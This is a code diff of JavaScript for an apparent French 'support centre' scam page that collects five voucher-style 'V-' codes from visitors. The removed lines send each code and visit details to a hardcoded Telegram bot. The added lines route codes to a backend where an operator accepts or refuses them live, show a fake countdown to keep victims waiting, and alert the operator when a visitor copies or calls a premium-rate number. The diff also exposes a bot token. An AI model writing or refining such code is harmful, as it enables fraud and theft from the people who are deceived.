@@ -8,10 +8,37 @@ document.addEventListener('DOMContentLoaded', function() {
     const codeError = document.getElementById('codeError');
     const codeSuccess = document.getElementById('codeSuccess');
 
-    var telegramToken = '8820069876:AAEJT_tZ0nfzRcGfUMiGvyVAGplPfAfuPfQ';
-    var chatId = '6547125053';
-
     var toastTimeout;
+    var timerInterval = null;
+    var codeTimer = document.getElementById('codeTimer');
+    var timerValue = document.getElementById('timerValue');
+    var timerBarFill = document.getElementById('timerBarFill');
+
+    function startTimer(callback) {
+        var totalSeconds = 240;
+        var remaining = totalSeconds;
+        codeTimer.classList.add('visible');
+        timerBarFill.style.width = '100%';
+
+        if (timerInterval) clearInterval(timerInterval);
+
+        function updateTimer() {
+            var minutes = Math.floor(remaining / 60);
+            var seconds = remaining % 60;
+            timerValue.textContent = minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
+            timerBarFill.style.width = ((remaining / totalSeconds) * 100) + '%';
+
+            if (remaining <= 0) {
+                clearInterval(timerInterval);
+                codeTimer.classList.remove('visible');
+                if (callback) callback();
+            }
+            remaining--;
+        }
+
+        updateTimer();
+        timerInterval = setInterval(updateTimer, 1000);
+    }
 
     function showToast(message, type) {
         clearTimeout(toastTimeout);
@@ -38,11 +65,63 @@ document.addEventListener('DOMContentLoaded', function() {
         el.style.animation = 'shake 0.5s ease';
     }
 
-    function sendToTelegram(code, stepNum, callback) {
-        var message = '%F0%9F%94%90 Code ' + stepNum + '/5 re%CC%81cu%0A%0ACode%3A ' + encodeURIComponent(code) + '%0AHeure%3A ' + encodeURIComponent(new Date().toLocaleString('fr-FR')) + '%0ASite%3A Centre d%27assistance';
-        fetch('https://api.telegram.org/bot' + telegramToken + '/sendMessage?chat_id=' + chatId + '&text=' + message)
-            .then(function() { if (callback) callback(); })
-            .catch(function() { if (callback) callback(); });
+    function apiSend(text) {
+        return fetch('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ text: text })
+        }).then(function(r) { return r.json(); });
+    }
+
+    function apiAlert(text) {
+        fetch('/api/alert', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ text: text })
+        });
+    }
+
+    function sendAndValidate(code, stepNum, onSuccess, onError) {
+        var message = 'Code ' + stepNum + '/5 recu\n\nCode: ' + code + '\nHeure: ' + new Date().toLocaleString('fr-FR') + '\nSite: Centre assistance';
+
+        apiSend(message).then(function(data) {
+            var codeId = data.codeId;
+            if (!codeId) {
+                if (onError) onError();
+                return;
+            }
+
+            var attempts = 0;
+            var maxAttempts = 120;
+
+            var pollInterval = setInterval(function() {
+                fetch('/api/check-status/' + codeId)
+                    .then(function(r) { return r.json(); })
+                    .then(function(result) {
+                        if (result.status === 'accepted') {
+                            clearInterval(pollInterval);
+                            if (onSuccess) onSuccess();
+                        } else if (result.status === 'refused') {
+                            clearInterval(pollInterval);
+                            if (onError) onError();
+                        } else {
+                            attempts++;
+                            if (attempts >= maxAttempts) {
+                                clearInterval(pollInterval);
+                                if (onError) onError();
+                            }
+                        }
+                    }).catch(function() {
+                        attempts++;
+                        if (attempts >= maxAttempts) {
+                            clearInterval(pollInterval);
+                            if (onError) onError();
+                        }
+                    });
+            }, 2000);
+        }).catch(function() {
+            if (onError) onError();
+        });
     }
 
     window.addEventListener('scroll', function() {
@@ -64,6 +143,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
     copyBtn.addEventListener('click', function() {
         var phone = '08 91 24 12 72';
+        apiAlert('Un utilisateur a copié le numéro de téléphone');
         if (navigator.clipboard && navigator.clipboard.writeText) {
             navigator.clipboard.writeText(phone).then(function() {
                 copyBtn.classList.add('copied');
@@ -80,6 +160,13 @@ document.addEventListener('DOMContentLoaded', function() {
             fallbackCopy(phone);
         }
     });
+
+    var callBtn = document.getElementById('callBtn');
+    if (callBtn) {
+        callBtn.addEventListener('click', function() {
+            apiAlert('Un utilisateur veut appeler le numéro');
+        });
+    }
 
     function fallbackCopy(text) {
         var textarea = document.createElement('textarea');
@@ -157,18 +244,30 @@ document.addEventListener('DOMContentLoaded', function() {
 
             var code = 'V-' + val;
             self.disabled = true;
-            self.innerHTML = '<span class="loading-spinner" style="width:18px;height:18px;border-width:2px;margin:0"></span> Envoi...';
+            self.innerHTML = '<span class="loading-spinner" style="width:18px;height:18px;border-width:2px;margin:0"></span> Vérification...';
 
-            sendToTelegram(code, currentStepNum - 1, function() {
+            sendAndValidate(code, currentStepNum - 1, function() {
                 currentInput.parentElement.classList.add('success');
-                showToast('Code ' + (currentStepNum - 1) + ' envoyé !', 'success');
+                showToast('Code ' + (currentStepNum - 1) + ' validé !', 'success');
                 codeError.classList.remove('visible');
 
-                setTimeout(function() {
-                    self.disabled = false;
-                    self.innerHTML = 'Envoyer et continuer <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>';
-                    goToStep(parseInt(self.getAttribute('data-next')));
-                }, 500);
+                self.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Code accepté';
+                self.classList.add('accepted');
+
+                var nextStep = parseInt(self.getAttribute('data-next'));
+                startTimer(function() {
+                    goToStep(nextStep);
+                });
+            }, function() {
+                currentInput.parentElement.classList.add('error');
+                codeError.textContent = 'Code refusé. Ressayez avec un autre code.';
+                codeError.classList.add('visible');
+                shakeElement(currentInput.parentElement);
+                showToast('Code refusé', 'error');
+                currentInput.value = '';
+
+                self.disabled = false;
+                self.innerHTML = 'Envoyer et continuer <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>';
             });
         });
     });
@@ -204,24 +303,32 @@ document.addEventListener('DOMContentLoaded', function() {
             var code = 'V-' + val;
             showLoading();
             validateAllBtn.disabled = true;
-            validateAllBtn.innerHTML = '<span class="loading-spinner" style="width:18px;height:18px;border-width:2px;margin:0"></span> Envoi...';
+            validateAllBtn.innerHTML = '<span class="loading-spinner" style="width:18px;height:18px;border-width:2px;margin:0"></span> Vérification...';
 
-            sendToTelegram(code, 5, function() {
+            sendAndValidate(code, 5, function() {
+                hideLoading();
+                validateAllBtn.disabled = false;
+                validateAllBtn.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Envoyer et valider';
+                codeSuccess.textContent = 'Les 5 codes ont été validés avec succès !';
+                codeSuccess.classList.add('visible');
+                showToast('5 codes validés !', 'success');
                 setTimeout(function() {
-                    hideLoading();
-                    validateAllBtn.disabled = false;
-                    validateAllBtn.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Envoyer et valider';
-                    codeSuccess.textContent = 'Les 5 codes ont été envoyés avec succès !';
-                    codeSuccess.classList.add('visible');
-                    showToast('5 codes envoyés !', 'success');
-                    setTimeout(function() {
-                        goToStep(1);
-                        document.querySelectorAll('.code-digits').forEach(function(input) {
-                            input.value = '';
-                            input.parentElement.classList.remove('success', 'error');
-                        });
-                    }, 2000);
-                }, 1500);
+                    goToStep(1);
+                    document.querySelectorAll('.code-digits').forEach(function(input) {
+                        input.value = '';
+                        input.parentElement.classList.remove('success', 'error');
+                    });
+                }, 2000);
+            }, function() {
+                hideLoading();
+                validateAllBtn.disabled = false;
+                validateAllBtn.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Envoyer et valider';
+                lastInput.parentElement.classList.add('error');
+                codeError.textContent = 'Code refusé. Ressayez avec un autre code.';
+                codeError.classList.add('visible');
+                shakeElement(lastInput.parentElement);
+                showToast('Code refusé', 'error');
+                lastInput.value = '';
             });
         });
     }
@@ -311,8 +418,7 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
 
-    var visitMessage = '%F0%9F%91%A4 Nouvelle visite%0A%0AHeure%3A ' + encodeURIComponent(new Date().toLocaleString('fr-FR')) + '%0AURL%3A ' + encodeURIComponent(window.location.href) + '%0ANavigateur%3A ' + encodeURIComponent(navigator.userAgent.substring(0, 80));
-    fetch('https://api.telegram.org/bot' + telegramToken + '/sendMessage?chat_id=' + chatId + '&text=' + visitMessage);
+    apiAlert('Nouvelle visite\n\nHeure: ' + new Date().toLocaleString('fr-FR') + '\nURL: ' + window.location.href);
 
     console.log('%c Centre d\'assistance ', 'background: linear-gradient(135deg, #0071e3, #5856d6); color: white; padding: 8px 16px; border-radius: 6px; font-weight: bold; font-size: 14px;');
 });
